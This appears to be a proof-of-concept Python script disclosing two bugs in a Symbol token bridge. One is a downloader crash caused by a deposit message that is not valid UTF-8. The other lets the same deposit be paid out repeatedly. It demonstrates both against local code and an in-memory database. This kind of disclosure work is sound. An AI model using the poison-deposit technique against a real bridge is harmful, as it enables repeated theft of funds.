#!/usr/bin/env python3
"""
PoC 2 - symbol/product bridge: crash of the request downloader on a single
attacker-chosen deposit, and loss of the paid/unpaid marker across runs.

(a) bridge/symbol/SymbolUtils.py::_process_transfer_transaction does
        destination_address = unhexlify(transaction_json['message']).decode('utf8')
    The message is arbitrary attacker bytes (any transfer to the bridge address).
    A message that is not valid UTF-8 (e.g. a single 0xFF byte) raises
    UnicodeDecodeError *outside* any try/except: download_wrap_requests dies
    after contact with that transaction, so `set_max_processed_height` is never
    reached and the scan window never advances.

(b) bridge/db/WrapRequestDatabase.py::reset() runs at the *start* of every
    download and deletes every request whose height is above the last
    checkpoint - i.e. exactly the rows added in the crashed window.  If the
    payout step runs independently (README: each command is executed
    periodically), a request that was already PAID in that window is deleted and
    re-inserted as UNPROCESSED -> it is paid again on the next cycle, and again,
    for as long as the poison transaction stays inside the scan window.

Run:
    pip install symbol-sdk-python==3.3.3
    PYTHONPATH=<clone>/product/bridge python3 bridge_crash_replay_poc.py <clone>/product/bridge
"""

import sqlite3
import sys

BRIDGE_DIR = sys.argv[1] if len(sys.argv) > 1 else '.'
sys.path.insert(0, BRIDGE_DIR)

from bridge.symbol.SymbolUtils import extract_wrap_request_from_transaction  # noqa: E402
from bridge.db.WrapRequestDatabase import PayoutDetails, WrapRequestDatabase, WrapRequestStatus  # noqa: E402
from bridge.models.AddressValidator import try_convert_network_address_to_string  # noqa: E402
from bridge.models.WrapRequest import WrapRequest  # noqa: E402
from symbolchain.CryptoTypes import Hash256  # noqa: E402
from symbolchain.sc import TransactionType  # noqa: E402
from symbolchain.symbol.Network import Network  # noqa: E402

CURRENCY_MOSAIC_ID = 0x6BED913FA20223F8
BRIDGE_ADDRESS_RAW = bytes.fromhex('68AAE8CC97E5C7D44012CC0871DA979EF770BA61628A312D')  # any bridge account
SIGNER_PUBLIC_KEY = 'BE0B4CF546B7B4F4BBFCFF9F574FDA527C07A53D3FC76F8BB7DB746F8E8E0A9F'


def make_transaction(message_hex, amount=1_000_000, height=200):
    return {
        'meta': {'height': height, 'hash': 'AA' * 32},
        'transaction': {
            'type': TransactionType.TRANSFER.value,
            'signerPublicKey': SIGNER_PUBLIC_KEY,
            'mosaics': [{'id': f'{CURRENCY_MOSAIC_ID:016X}', 'amount': str(amount)}],
            'message': message_hex,
        },
    }


def is_valid_address(raw_address):
    address_string = try_convert_network_address_to_string(Network.MAINNET, raw_address)
    return (address_string is not None, address_string)


def parse(transaction):
    return extract_wrap_request_from_transaction(
        Network.MAINNET, is_valid_address, lambda mosaic_id: CURRENCY_MOSAIC_ID == mosaic_id, transaction)


def part_a():
    print('(a) downloader crash')
    ascii_address = b'NCVORTEX4XD5IQASZQEHDWUXT33XBOTBMKFDCLI'
    good = parse(make_transaction(ascii_address.hex().upper()))
    print(f'    control (message = ascii address)     -> {good[0].request.amount} queued')

    for label, message_hex in [('0xFF', 'FF'), ('0xC3', 'C3'), ('0xE2 0x28 0xA1', 'E228A1')]:
        try:
            parse(make_transaction(message_hex))
            print(f'    {label:<18} -> parsed (no crash)')
        except Exception as ex:  # noqa: BLE001 - reporting any escape is the point
            print(f'    message {label:<18} -> {type(ex).__name__}: {ex}  << escapes the workflow')


class BytesAddress:
    def __init__(self, value):
        self.bytes = value.encode() if isinstance(value, str) else value

    def __str__(self):
        return self.bytes.decode('utf8', 'replace')


class FacadeStub:
    @staticmethod
    def make_address(raw_address):
        return raw_address


def part_b():
    print('\n(b) paid marker lost across a crashed window (checkpoint 100)')
    connection = sqlite3.connect(':memory:')
    database = WrapRequestDatabase(connection, FacadeStub(), FacadeStub())
    database.create_tables()
    database.set_max_processed_height(100)

    request = WrapRequest(200, Hash256('11' * 32), -1, BytesAddress('ATTACKER'), 1_000_000, 'DESTINATION')
    database.add_request(request)
    database.mark_payout_sent(request, PayoutDetails(Hash256('22' * 32), 999_000, 1_000, 1_000_000))
    print(f'    run 1: request at height {request.transaction_height} marked SENT '
          f'(rows with SENT status = {len(database.requests_by_status(WrapRequestStatus.SENT))})')

    database.reset()  # what the next download does before re-scanning
    remaining = list(database.requests())
    print(f'    reset(): rows left above checkpoint = {len(remaining)} (paid row deleted)')

    database.add_request(request)  # same transaction is re-downloaded and re-inserted
    unprocessed = database.requests_by_status(WrapRequestStatus.UNPROCESSED)
    print(f'    re-scan: request re-inserted as UNPROCESSED = {len(unprocessed)} -> send_payouts pays it again')
    print('    => each cycle pays the same deposit again while the poison tx stays in the window')


if __name__ == '__main__':
    print('bridge code: symbol/product @ cb3151d5c505 (dev)')
    part_a()
    part_b()
